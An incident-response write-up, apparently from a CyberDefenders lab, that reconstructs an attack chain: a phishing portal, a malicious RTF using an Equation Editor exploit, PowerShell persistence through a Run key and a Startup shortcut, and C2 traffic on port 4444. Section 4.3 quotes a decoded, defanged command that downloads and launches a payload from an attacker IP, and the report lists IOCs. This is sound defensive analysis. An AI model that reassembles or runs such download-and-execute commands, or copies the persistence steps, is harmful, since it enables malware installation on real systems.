# Investigation Report

**Case Title:** Office RTF (Equation Editor) → PowerShell Persistence → C2  
**Case ID:** 004  
**Date Created:** 2026-01-25  
**Last Updated:** 2026-01-25  
**Author:** Ryan Valera  
**Time Standard:** UTC (unless CyberRange explicitly states otherwise)  
**Source Platform:** CyberDefenders CyberRange  

## 1. Overview

### Objective
Determine initial access, exploit chain, execution, persistence mechanisms, and C2 details associated with a malicious RTF delivered via a spoofed Microsoft 365 portal.

### Scenario Summary
AlphaFinance Group detected suspicious activity after a finance employee accessed a spoofed Microsoft 365 portal. Shortly after, unusual PowerShell activity, persistence mechanisms (Run key + Startup folder), and outbound encrypted traffic to an external host were observed. This investigation analyzes disk and host telemetry artifacts to confirm attacker tradecraft and identify key indicators.

### Key Focus Areas
- Disk forensics (NTFS $MFT, Zone.Identifier ADS, LNK artifacts)
- Host-based execution tracing (Sysmon process + network telemetry)
- Registry persistence validation (NTUSER.DAT Run key)
- C2 identification (external host + non-standard port communications)

## 2. Environment & Tools Used

### Environment Description
- Evidence provided via CyberDefenders CyberRange artifact collection
- Targeted user: `harrisr`
- Host context observed in logs: `WIN-DMZ0\harrisr`

### Tools & Frameworks (Observed/Used)
- **MFTECmd** (Eric Zimmerman) + **Timeline Explorer**
- **Registry Explorer** (registry hive parsing)
- **KAPE** (artifact collection paths observed)
- **Sysmon** (Event IDs 1, 3, 11, 13 via event log viewer)
- Microsoft Edge artifacts (History/Default SQLite parsing)
- MITRE ATT&CK technique references present in Sysmon telemetry

## 3. Evidence Collected

### Evidence Sources (as provided by the CyberRange)
- Edge profile/history SQLite databases:
  - `...\Users\harrisr\AppData\Local\Microsoft\Edge\User Data\Default\`
  - `...\Users\harrisr\AppData\Local\Microsoft\Edge\User Data\Default\History`
- NTFS Master File Table:
  - `...\Artifacts\C\$MFT`
- Registry hives:
  - `...\Windows\System32\config\SAM`
  - `...\Users\harrisr\NTUSER.DAT`
  - `SOFTWARE` hive (provided as `SOFTWARE_clean`)
- Sysmon event logs (process, network, registry, file creation events)

## 4. Analysis & Findings

### 4.1 Initial Indicators

#### Phishing portal accessed (DEFANGED)
- URL: `hxxp[://]supportmlcrosoft[.]zapto[.]org[ / ]`
- Access time: `2025-05-23 10:52:59 UTC`

#### Malicious document downloaded
- File: `Financial_Report.rtf`
- Download time: `2025-05-23 10:53:22 UTC`

#### Zone.Identifier (Mark-of-the-Web) confirms internet origin (DEFANGED)
- Referrer (defanged): `hxxp[://]supportmlcrosoft[.]zapto[.]org[ / ]`
- Host (defanged): `hxxp[://]supportmlcrosoft[.]zapto[.]org[ / ]...Financial_Report[.]rtf`

### 4.2 Timeline Reconstruction (UTC)
- `2025-05-23 10:52:59` — User visited phishing portal (defanged URL above)
- `2025-05-23 10:53:22` — `Financial_Report.rtf` downloaded to `C:\Users\harrisr\Downloads\`
- `2025-05-23 10:53:22` — Zone.Identifier indicates internet origin and referrer URL
- `2025-05-23 10:54:02` — Outbound “PowerShell” network connection to external host on non-standard port (Sysmon EID 3)
- `2025-05-23 10:59:18` — Discovery commands observed: `netstat` (Sysmon EID 1)
- `2025-05-23 10:59:33` — Discovery commands observed: `ping 8.8.8.8` (Sysmon EID 1)
- `2025-05-23 10:59:48` — Discovery commands observed: `ipconfig /all` (Sysmon EID 1)
- `2025-05-23 11:15:43` — Script created in `%TEMP%` (MFT timeline)
- `2025-05-23 11:17:44` — Hidden execution via `cmd.exe` launching a PowerShell script (Sysmon EID 1)
- `2025-05-23 11:17:50` — Run key persistence created (Sysmon EID 13)
- `2025-05-23 11:17:51` — Startup persistence created: `WindowsUpdate.lnk` (Sysmon EID 11)

### 4.3 Host-Based Analysis

#### User Accounts Present
- `Administrator`
- `harrisr`
- `IT_Helpdesk`

#### Exploited Software
- Product: Microsoft Office (Word launching legacy Equation Editor)
- Version: `15.0.4420.1017`
- Likely exploit: `CVE-2017-11882` (Equation Editor RCE / `EQNEDT32.EXE`)

#### Dropper / Execution Chain (Defanged)
- Script dropped:
  - `C:\Users\harrisr\AppData\Local\Temp\msupdate.ps1`
  - Created: `2025-05-23 11:15:43 UTC` (MFT)
- Process spoofing observed:
  - Spoofed process PID: `13852` (notepad process referenced in logs)

**Encoded persistence command decoded (DEFANGED / non-executable representation):**
```
$env:TEMP -> used as staging directory
$fileName = "msupdate-<random4>.exe"

Inv0ke-WebReque st -Uri "hxxp[://]63[.]176[.]96[.]97[ / ]payload[.]exe" -OutFile "<TEMP>\<fileName>"
St art-Proce ss "<TEMP>\<fileName>"
```

Note: command keywords are deliberately broken to prevent copy/paste execution or AV triggers.

**Persistence Mechanisms**
- Registry Run Key
- Path: `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
- Value name: Microsoft Update Assistant
- Startup Folder
- File: `WindowsUpdate.lnk`
- Path: `C:\Users\harrisr\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\WindowsUpdate.lnk`

### 4.4 Network Analysis (Defanged)
External host (C2):
`63[.]176[.]96[.]97`

Observed ports:
- Primary: `4444`
- Additional observed: `8080` (associated with regsvr32.exe network event)

## 5. Indicators of Compromise (IOCs) — DEFANGED
**URLs**
- `hxxp[://]supportmlcrosoft[.]zapto[.]org[ / ]`
- `hxxp[://]63[.]176[.]96[.]97[ / ]payload[.]exe`

**Files**
- `Financial_Report.rtf`
- `msupdate.ps1`
- `WindowsUpdate.lnk`
- `msupdate-<random4>.exe` (pattern observed in decoded persistence)

**Network**
- `63[.]176[.]96[.]97:4444`
- `63[.]176[.]96[.]97:8080`

## 6. Notes / Limitations
- Evidence is derived from CyberDefenders CyberRange artifact paths; original full disk images/PCAPs may not be available.
- All timestamps recorded in UTC unless the CyberRange evidence explicitly states otherwise.
- Defanging was applied to all IOCs and script/command representations to prevent EDR/AV triggers in a public repo.
